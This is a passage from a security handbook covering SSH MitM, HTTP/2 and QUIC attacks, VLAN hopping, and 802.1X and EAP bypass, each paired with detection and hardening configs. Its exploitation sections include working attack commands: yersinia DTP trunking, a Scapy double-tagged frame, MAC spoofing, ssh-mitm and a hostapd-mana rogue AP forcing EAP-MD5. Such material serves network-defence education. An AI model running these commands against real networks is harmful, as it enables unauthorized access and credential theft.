LogLevel VERBOSE
```

```bash
# Verify hardened config
sshd -T | grep -E '^(kexalgorithms|ciphers|macs|hostkeyalgorithms)'
ssh-audit target.com:22
```

### 13.3 SSH key harvesting and host key verification

**Mechanism.** SSH host keys authenticate the server to the client. If the client does not verify the host key on first connection (TOFU — Trust On First Use), a MitM can present their own key. Once accepted, the attacker can intercept all traffic.

**Exploitation.**

```bash
# Scan network for SSH host keys
ssh-keyscan -t ed25519,rsa 10.0.0.0/24 2>/dev/null

# nmap — harvest SSH host keys
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full 10.0.0.0/24

# SSH MitM proxy (for authorized testing)
pip install ssh-mitm
ssh-mitm server --remote-host target.com
```

**Hardening.**

```bash
# Distribute host keys via DNS (SSHFP records)
# Generate SSHFP records
ssh-keygen -r hostname.target.com

# DNS record:
# hostname.target.com IN SSHFP 4 2 <SHA-256 fingerprint>
# Type 4 = Ed25519, Algorithm 2 = SHA-256

# Client config — verify SSHFP
# ~/.ssh/config
Host *
    VerifyHostKeyDNS yes
    StrictHostKeyChecking ask
    HashKnownHosts yes
```

**CVEs.** CVE-2023-48795 (Terrapin — affects OpenSSH < 9.6, PuTTY < 0.80, libssh < 0.10.6). CVE-2023-46445/CVE-2023-46446 (AsyncSSH — rogue extension negotiation via Terrapin). CVE-2016-20012 (OpenSSH user enumeration via authentication timing).

---

## 14. HTTP/2 and HTTP/3 attacks

### 14.1 HPACK bomb

**Mechanism.** HTTP/2 uses HPACK header compression (RFC 7541) which maintains a dynamic table of recently used header fields. An attacker can send a small compressed header block that decompresses to an enormous amount of data, consuming server memory. A 1 KB compressed payload can decompress to hundreds of MB.

The attack exploits the Huffman encoding in HPACK: carefully crafted header values with high compression ratios overwhelm the server's decompression buffer.

**Hardening.**

```
# Nginx — limit HPACK table size and header size
http2_max_header_size 16k;
http2_max_field_size 8k;
large_client_header_buffers 4 8k;

# Apache
LimitRequestFieldSize 8190
LimitRequestFields 100

# HAProxy
tune.h2.header-table-size 4096
tune.h2.max-frame-size 16384
```

### 14.2 HTTP/2 rapid reset (CVE-2023-44487)

**Mechanism.** HTTP/2 supports stream multiplexing — multiple request/response streams over a single TCP connection. The rapid reset attack sends HTTP/2 HEADERS frames (initiating a new stream/request) immediately followed by RST_STREAM frames (canceling the stream). The server processes the HEADERS frame — allocating resources, parsing headers, possibly initiating backend requests — before the RST_STREAM arrives. By sending thousands of HEADERS+RST_STREAM pairs per second, the attacker exhausts server resources without the streams counting toward the HTTP/2 MAX_CONCURRENT_STREAMS limit (because they're immediately canceled).

The attack was used in the wild in August-October 2023 to generate DDoS attacks exceeding 398 million requests per second (observed by Cloudflare/Google/AWS).

**Detection.**

```bash
# Wireshark filter — rapid stream creation + reset
http2.type == 1 && http2.type == 3  # HEADERS followed by RST_STREAM
# Look for high volume of RST_STREAM frames
http2.type == 3  # RST_STREAM frames

# tcpdump — capture HTTP/2 traffic for analysis
tcpdump -i eth0 -w h2_capture.pcap 'tcp port 443'
```

Suricata:
```
alert http2 any any -> any any (msg:"HTTP/2 Rapid Reset Attack - High RST_STREAM Rate"; \
  http2.type:3; threshold:type both, track by_src, count 100, seconds 1; \
  classtype:attempted-dos; reference:cve,2023-44487; rev:1;)
```

**Hardening.**

```bash
# Nginx (patched in 1.25.3)
http2_max_concurrent_streams 128;
limit_req_zone $binary_remote_addr zone=api:10m rate=100r/s;

# Update to patched versions:
# Nginx >= 1.25.3
# Apache >= 2.4.58
# Go >= 1.21.3 / 1.20.10
# Node.js >= 18.18.2 / 20.8.1

# HAProxy
tune.h2.max-concurrent-streams 100
timeout http-keep-alive 10s

# Envoy proxy — configure stream limits
http2_protocol_options:
  max_concurrent_streams: 100
  initial_stream_window_size: 65536
```

### 14.3 HTTP/3 / QUIC-specific attacks

**Mechanism.** HTTP/3 runs over QUIC (UDP-based transport, RFC 9000). QUIC introduces new attack surfaces:

1. **UDP amplification.** QUIC's initial handshake can be exploited for amplification. Mitigation: QUIC mandates that initial packets be at least 1200 bytes (padding requirement) and servers must not send more than 3x the data received before address validation.

2. **Connection migration abuse.** QUIC supports connection migration (changing IP/port mid-connection). An attacker can attempt to hijack a connection by sending packets from a new address with a valid connection ID.

3. **Version negotiation downgrade.** QUIC version negotiation is unencrypted. An active MitM can modify the version list to force an older, potentially vulnerable QUIC version.

**Detection.**

```bash
# Wireshark — QUIC traffic
quic
quic.version
quic.connection.number > 100  # High connection rate

# nftables — monitor QUIC traffic volume
nft add rule inet filter input udp dport 443 counter
```

**Hardening.**

```bash
# nftables — rate-limit QUIC initial packets
nft add rule inet filter input udp dport 443 \
  meta length < 1200 drop  # Drop undersized QUIC packets

# Nginx (quic module) — configure QUIC limits
quic_retry on;  # Enable address validation via Retry packets
```

**CVEs.** CVE-2023-44487 (HTTP/2 rapid reset — CVSS 7.5, affected virtually all HTTP/2 implementations). CVE-2019-9511 through CVE-2019-9518 (8 HTTP/2 DoS vulnerabilities in various implementations — data dribble, ping flood, resource loop).

---

## 15. VLAN attacks

### 15.1 VLAN hopping — switch spoofing

**Mechanism.** VLAN hopping allows an attacker on one VLAN to access another VLAN without routing. Switch spoofing exploits DTP (Dynamic Trunking Protocol) — a Cisco proprietary protocol that automatically negotiates trunk links between switches. If a switch port is in `dynamic auto` or `dynamic desirable` mode, an attacker can send DTP frames to negotiate a trunk, gaining access to all VLANs carried on that trunk.

**Exploitation.**

```bash
# Yersinia — DTP attack (negotiate trunk)
sudo yersinia dtp -attack 1 -interface eth0

# Scapy — send DTP frames
python3 -c "
from scapy.all import *
from scapy.contrib.dtp import *
negotiate_trunk(iface='eth0')
"

# After trunk is established, create VLAN sub-interfaces
sudo ip link add link eth0 name eth0.100 type vlan id 100
sudo ip addr add 10.100.0.99/24 dev eth0.100
sudo ip link set eth0.100 up
# Now on VLAN 100
```

### 15.2 Double tagging

**Mechanism.** The attacker sends a frame with two 802.1Q VLAN tags. The first (outer) tag matches the attacker's native VLAN. The access switch strips the outer tag (normal behavior for native VLAN traffic) and forwards the frame with only the inner tag. The next switch treats the inner tag as the VLAN identifier and forwards the frame to the target VLAN.

Constraints: works only in one direction (attacker → target, no return path), the attacker's access port must be on the same VLAN as the trunk's native VLAN, and the target VLAN must be carried on the trunk.

**Exploitation.**

```bash
# Scapy — double-tagged frame
python3 -c "
from scapy.all import *
# Outer tag: VLAN 1 (native), Inner tag: VLAN 100 (target)
frame = Ether(dst='ff:ff:ff:ff:ff:ff') / \
    Dot1Q(vlan=1) / \
    Dot1Q(vlan=100) / \
    IP(dst='10.100.0.1') / \
    ICMP()
sendp(frame, iface='eth0')
"

# Yersinia — 802.1Q double tagging
sudo yersinia dot1q -attack 1 -interface eth0
```

**Detection.**

```bash
# Wireshark — double-tagged frames
vlan.id && vlan.id  # Frames with two VLAN tags

# Suricata
alert vlan any any -> any any (msg:"VLAN Double Tagging Detected"; \
  vlan.id; vlan.id; classtype:attempted-admin; rev:1;)
```

### 15.3 Private VLAN bypass

**Mechanism.** Private VLANs (PVLAN) isolate hosts within the same VLAN. Community ports can communicate with each other and the promiscuous port; isolated ports can only communicate with the promiscuous port. A PVLAN proxy attack sends frames to the promiscuous port (typically the default gateway) with a spoofed destination MAC, which the gateway then routes back into the PVLAN — bypassing isolation.

**Hardening — comprehensive VLAN security.**

```
# Cisco IOS — disable DTP on all access ports
interface range GigabitEthernet0/1-48
 switchport mode access
 switchport nonegotiate                    ! Disable DTP
 switchport access vlan 10                 ! Explicit VLAN assignment
 spanning-tree portfast
 spanning-tree bpduguard enable

# Cisco IOS — trunk port hardening
interface GigabitEthernet0/49
 switchport mode trunk
 switchport trunk native vlan 999          ! Unused native VLAN
 switchport trunk allowed vlan 10,20,30    ! Explicit VLAN list
 switchport nonegotiate                    ! Disable DTP

# Change native VLAN to unused VLAN (prevent double-tagging)
! Global — tag native VLAN traffic on trunks
vlan dot1q tag native

# Cisco IOS — Private VLAN configuration
vlan 100
 private-vlan primary
vlan 101
 private-vlan isolated
vlan 102
 private-vlan community
vlan 100
 private-vlan association 101,102

# Juniper JunOS — disable DTP equivalent
set interfaces ge-0/0/1 unit 0 family ethernet-switching port-mode access
set interfaces ge-0/0/1 unit 0 family ethernet-switching vlan members v10

# Juniper — trunk hardening
set interfaces ge-0/0/49 unit 0 family ethernet-switching port-mode trunk
set interfaces ge-0/0/49 unit 0 family ethernet-switching vlan members [v10 v20 v30]
set interfaces ge-0/0/49 native-vlan-id 999
```

---

## 16. 802.1X bypass

### 16.1 MAB bypass

**Mechanism.** MAC Authentication Bypass (MAB) is a fallback authentication method for devices that don't support 802.1X (printers, IP phones, IoT). The switch authenticates the device based on its MAC address alone. An attacker who discovers an authorized MAC address can spoof it to bypass port authentication.

**Exploitation.**

```bash
# Discover authorized MAC addresses
# Passive: sniff the network for devices on authenticated ports
tcpdump -i eth0 -nn ether src not YOUR_MAC

# Active: nmap to find devices, then check MAC in ARP table
nmap -sn 10.0.0.0/24
arp -a

# Spoof MAC address
sudo ip link set eth0 down
sudo ip link set eth0 address aa:bb:cc:dd:ee:ff  # Authorized device's MAC
sudo ip link set eth0 up
sudo dhclient eth0
```

### 16.2 RADIUS relay attacks

**Mechanism.** 802.1X uses RADIUS (Remote Authentication Dial-In User Service) between the authenticator (switch) and authentication server. RADIUS uses a shared secret for integrity (MD5-based authenticator). If the shared secret is weak, an attacker can capture RADIUS traffic and crack the secret offline, then inject or modify RADIUS responses.

**Exploitation.**

```bash
# Capture RADIUS traffic
tcpdump -i eth0 -w radius_capture.pcap 'udp port 1812 or udp port 1813'

# Crack RADIUS shared secret
# Tool: radius_crack (offline dictionary attack on RADIUS authenticator)
```

### 16.3 EAP downgrade

**Mechanism.** EAP (Extensible Authentication Protocol) supports multiple methods: EAP-TLS (mutual certificate authentication — strongest), EAP-PEAP (server cert + inner authentication), EAP-TTLS, EAP-MD5 (no server authentication — weakest). An attacker acting as a rogue AP or MitM can manipulate EAP negotiation to force a downgrade to a weaker method (e.g., EAP-MD5), then capture and crack credentials.

**Exploitation.**

```bash
# hostapd-mana — rogue AP with EAP downgrade
# Configuration for EAP credential capture
cat > mana.conf << 'EOF'
interface=wlan0
ssid=CorpWiFi
channel=6
hw_mode=g
ieee8021x=1
eap_server=1
eap_user_file=mana.eap_user
# Force EAP-MD5 (weakest)
EOF

cat > mana.eap_user << 'EOF'
* MD5
EOF

hostapd-mana mana.conf
```

**Hardening — 802.1X best practices.**

```
# Cisco IOS — 802.1X with MAB fallback (hardened)
aaa new-model
aaa authentication dot1x default group radius
aaa authorization network default group radius

dot1x system-auth-control

interface GigabitEthernet0/1
 switchport mode access
 switchport access vlan 10
 authentication port-control auto
 authentication order dot1x mab          ! Try 802.1X first
 authentication priority dot1x mab
 dot1x pae authenticator
 dot1x timeout tx-period 5
 mab                                     ! MAB fallback
 authentication violation restrict       ! Restrict on failure
 authentication event fail action authorize vlan 999  ! Quarantine VLAN

# RADIUS server — enforce EAP-TLS (strongest)
# FreeRADIUS — eap module config
eap {
    default_eap_type = tls               # Force EAP-TLS
    tls {
        private_key_file = /etc/raddb/certs/server.pem
        certificate_file = /etc/raddb/certs/server.pem
        ca_file = /etc/raddb/certs/ca.pem
        require_client_cert = yes         # Mutual TLS
    }
    # Disable weak EAP methods
    # md5 { }    # REMOVED
}

# RADIUS shared secret — use 32+ character random secret
# Rotate regularly — compromised shared secret = full bypass

# Juniper JunOS — 802.1X
set protocols dot1x authenticator interface ge-0/0/1 mac-radius
set protocols dot1x authenticator interface ge-0/0/1 server-fail vlan-name quarantine
```

---

## 17. Cross-references

**To Chapter 13A:** The cryptographic primitives attacked here (RSA PKCS#1, DH, CBC, ECDSA) are described in Chapter 13A. Understanding the mathematical basis (§2.1 RSA, §2.2 ECC, §1.3 padding) is prerequisite for understanding why the protocol-level attacks work.

**To Domain 9 (network security):** The TLS attacks (§2) are the protocol-level complement to the TLS security coverage in Chapter 9A §3. RPKI/BGPsec (§3.1) and DNSSEC (§3.2) secure the routing and naming layers that TLS depends on. DNS attacks (§6) expand on Domain 9's DNS coverage with offensive techniques. VLAN attacks (§15) and ARP attacks (§7) target the Layer 2 infrastructure covered in Domain 9 from a network architecture perspective. 802.1X bypass (§16) attacks the NAC controls described in Domain 9.

**To Domain 11 (malware/tradecraft):** Kerberos ticket attacks (§4) and NTLM relay (§5) are the primary lateral-movement techniques in Active Directory environments. The credential-dumping techniques that provide the hashes and tickets (LSASS parsing, NTDS.DIT extraction, DCSync) are operational tradecraft covered in Domain 11. DNS tunneling (§6.3) is a common C2 channel covered from the detection side in Domain 11.

**To Domain 10 (cloud):** Kerberos and NTLM are the authentication protocols for on-premises Active Directory. Azure AD extends these to the cloud (Azure AD Connect synchronizes hashes, PTA agents relay authentication, Kerberos is used for Azure AD DS). The hybrid identity architecture creates new relay and credential-theft paths spanning on-premises and cloud.

**To Domain 14 (Active Directory):** §4 (Kerberos) and §5 (NTLM) provide the protocol-level foundation. Domain 14 Chapter 14A §1 extends these with AD-specific attack chains (AS-REP Roasting enumeration, Kerberoasting, gMSA, ACL abuse, ADCS). LDAP injection (§11) targets the directory service that underlies all AD operations. SMTP attacks (§12) relate to Exchange server security in Domain 14B.

**To Domain 7 (host hardening):** SSH attacks (§13) target the remote administration protocol. The hardened `sshd_config` in §13.2 implements the host-level controls specified in Domain 7. NTP attacks (§10) undermine the time synchronization that Kerberos, TLS certificate validation, and log correlation depend on.

**To Domain 8 (wireless):** 802.1X bypass (§16) and EAP downgrade attacks apply directly to enterprise wireless security (WPA2/3-Enterprise). The rogue AP techniques in §16.3 are the wireless complement to the wired 802.1X bypass in §16.1-16.2.
